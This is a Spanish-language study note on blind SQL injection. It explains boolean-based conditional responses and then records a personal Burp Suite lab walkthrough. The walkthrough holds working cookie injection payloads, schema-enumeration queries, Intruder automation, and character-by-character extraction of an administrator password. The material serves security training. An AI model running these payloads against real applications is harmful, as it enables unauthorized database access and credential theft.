#Blind SQL Injection
La inyección ciega de SQL ocurre cuando una aplicación es vulnerable a la inyección de SQL
- Sus respuestas HTTP no contienen los resultados de la consulta SQL relevante ni los detalles de ningún error de la base de datos
- Muchas técnicas, como los ataques UNION, no son efectivas con las vulnerabilidades de inyección SQL ciega ( Blind SQL). **Esto se debe a que dependen de poder ver los resultados de la consulta inyectada dentro de las respuestas de la aplicación.**
- Todavía es posible explotar la inyección SQL ciega para acceder a datos no autorizados, pero se deben utilizar técnicas diferentes.

## Explotando Inyecciones ciegas con activando respuestas condicionales Exploiting blind SQL injection by triggering conditional responses

Considere una aplicación que utiliza cookies de seguimiento para recopilar análisis sobre el uso. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
Cuando se procesa una solicitud que contiene una cookie ```TrackingId```, la aplicación utiliza una consulta SQL para determinar si se trata de un usuario conocido:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta es vulnerable a la inyección SQL, pero **los resultados de la consulta no se devuelven al usuario. Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta devuelve algún dato. Si envía un ```TrackingId``` reconocido, la consulta devuelve datos y recibe un mensaje de "Bienvenido" en la respuesta.** Este comportamiento es suficiente para poder explotar la vulnerabilidad de inyección SQL ciega. Puede recuperar información activando diferentes respuestas de forma condicional, dependiendo de la condición inyectada. Para comprender cómo funciona este exploit, supongamos que se envían dos solicitudes que contienen a su vez los siguientes valores de cookie  ```TrackingId```:
```
…xyz' AND '1'='1 -El primero de estos valores hace que la consulta devuelva resultados, porque la condición AND '1'='1 inyectada es verdadera. Como resultado, se muestra el mensaje "Bienvenido de nuevo".
…xyz' AND '1'='2 -El segundo valor hace que la consulta no devuelva ningún resultado porque la condición inyectada es falsa. El mensaje "Bienvenido de nuevo" no se muestra.
```
Esto nos permite determinar la respuesta a cualquier condición inyectada y extraer datos pieza por pieza.

Por ejemplo, supongamos que hay una tabla llamada ```Users``` con las columnas ```Username ``` y ```Passwords ```, y un usuario llamado ``` Administrator```. Puede determinar la contraseña de este usuario enviando una serie de entradas para probar la contraseña, un carácter a la vez. Para hacer esto, comience con la siguiente entrada:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

xyz es el trackingID, esto funciona si la contraseña esta almacenada en claro y no el HASH
```

Esto devuelve el mensaje "Bienvenido nuevamente", que indica que la condición inyectada es verdadera y, por lo tanto, el primer carácter de la contraseña es mayor que m.
A continuación, enviamos la siguiente entrada:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
Esto no devuelve el mensaje "Bienvenido", lo que indica que la condición inyectada es falsa y, por lo tanto, el primer carácter de la contraseña no es mayor que t.

Finalmente, enviamos la siguiente entrada, que devuelve el mensaje "Bienvenido", confirmando así que el primer carácter de la contraseña es s:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Podemos continuar este proceso para determinar sistemáticamente la contraseña completa para el usuario Administrador.
```
SUBSTRING(string, start, length)

Es importante conocer como funciona el subtring - SUBSTRING(string, start, length)
string - la cadena de texto
start - El inicio de la cadena
length - el tamaño de la cadena 

¿Como se puede averigurar el tamaño de la cadena?
EN MS SQL SELECT LEN (string)

Ejemplificando la info anterior

xyz' AND LEN(SELECT Password FROM Users WHERE Username = 'Administrator')) > 10
xyz' AND LEN(SELECT Password FROM Users WHERE Username = 'Administrator')) < 20
xyz' AND LEN(SELECT Password FROM Users WHERE Username = 'Administrator')) = 15

```
### Laboratio  Blind SQL

Esta práctica de laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. Los resultados de la consulta SQL no se devuelven y no se muestran mensajes de error. Pero la aplicación incluye un mensaje de "Bienvenido" en la página si la consulta devuelve alguna fila. La base de datos contiene una tabla diferente llamada usuarios, con columnas llamadas nombre de usuario y contraseña. Debe aprovechar la vulnerabilidad de inyección SQL ciega para descubrir la contraseña del usuario administrador. Para resolver la práctica de laboratorio, inicie sesión como usuario administrador.

```
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
Voy a intentar con BURP SUITE

00) LO INTENTE EN EL GET Y NO VI NADA SIGNIFICATIVO
00) LO INTENTE EN LA COOKIE Y NADA -- sI ES EN LA COOKIE EL WELCOMEBACK DESAPARECE

0) LA INYECCION LA INTENTARE DIRECTAMENTE EN LA COOKIE
- Es en la cookie
- El Mensaje de Welcome desaparece

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='2';

1) VERIFICAR COMO SE COMPORTA CON ALGO VERDADERO

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='1'; 
El mensaje de WELCOME se manttiene
2) VERIFICAR COMO SE COMPORTA CON ALGO VERDADERO
El mensaje de WELCOME desaparece

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='2';

3) Dice que es una tabla llamada users pero diferente es decir como un user97238s

3.0)
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

Cookie: TrackingId=DyF31dkSZiKVIINI'+AND+'1'='2;


¿Cómo saber el nombre de la tabla? - EN el UNION tenemos esa info, pero es la unica forma?
¿Cómo saber la base de datos? - Suena cañon, es listar el esquema paso a paso
¿Hay alguna forma automatizada? -

Consulta base: xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
Consulta base: xyz' AND LEN(SELECT Password FROM users WHERE Username = 'Administrator')) = 15

3.1) Identificador Manejador, no es necesario todo el nombre
3.2) Aventarme directamente a la tabla

SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'-- // ESTE FILTRA Y PONE SOLO LAS TABLAS CREADAS POR EL USUARIO

SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--

CustomerName LIKE 'a%'; // COmando para buscar coincidencias

LEN (SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' AND table_name LIKE 'users%') > 0 // NECESITAMOS PRIMERO EL LEN, AQUI CONFIRMAMOS QUE ES POSGRES Y QUE SI EXISTE UNA TABLA 
SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' AND table_name LIKE 'users%'--  CONSULTA POSTGRESQL PARA CONOCER SI EXISTE UNA TABLA QUE INICIE CON STARTS

RESULTADO: users_xrkoxi

PASO 5 IDENTIFICAR LAS COLUMNAS

SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users_xrkoxi'-- // OBTIENE LAS COLUMNAS DE LA TABLA

##Reinici el laboratio
1 Se debe confirmar la inyección de SQL Blind
Con el verdadero y el falgo
La consulta base imaginaria sera
SELECT TRACKINGID FROM TACKINGTABLE WHERE TRACKINGID ='xyz'

SELECT TRACKINGID FROM TACKINGTABLE WHERE TRACKINGID ='xyz' AND 1=1 --
LA INYECCIÓN SERA: ' AND 1=1 --
TEN ENCUENTA EL '  porque en el codigo se en el que se genero la aplciación lleva '' de tal manera que cuando lo ingresas de manera manual debes omitir el del final

2 CONFIRMAR LA TABLA DE USUARIOS
AND (SELECT 'x' from users limit 1)='x' -> se confirmo la tabla

3 confimar usuario administrador

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator
Se confirma el usuario administrador

4 enumerar la contraseña

TrackingId=xyz' AND (SELECT password FROM users WHERE username='administrator')='administrator
TrackingId=xyz' AND (SELECT x FROM users WHERE username='administrator' and LENGTH(password )>1)='x

Se busca a traves de intruder que se automatiza la consulta
$ significa el valor que va a tomar intruder en el payload de numbero de 1 a 25, step 1
TrackingId=xyz' AND (SELECT x FROM users WHERE username='administrator' and LENGTH(password )=$1$)='x

el lenght que cambia el la respuesta correcta aunque tambien se puede filtrar la respuesta pero solo en la version PRO

para enumerar los caracteres de la contraseña
TrackingId=xyz' AND (SELECT substring (password,1,1) x FROM users WHERE username='administrator')='a'--

TrackingId=xyz' AND (SELECT substring (password,1,1) x FROM users WHERE username='administrator')='a'--
inicio en 0 la mia
040pgaz1eejq1swbf6n
0403pgaz1e8jq1swbf6n

0
1 0
2 4
3 0
5 p
6 g
7 a
8 z
9 1
10 e
12 j
13 q
14 1
15 s
16 w
17 b
18 f
19 6
20 n



```

# Hola
## HOLA
### HOLA
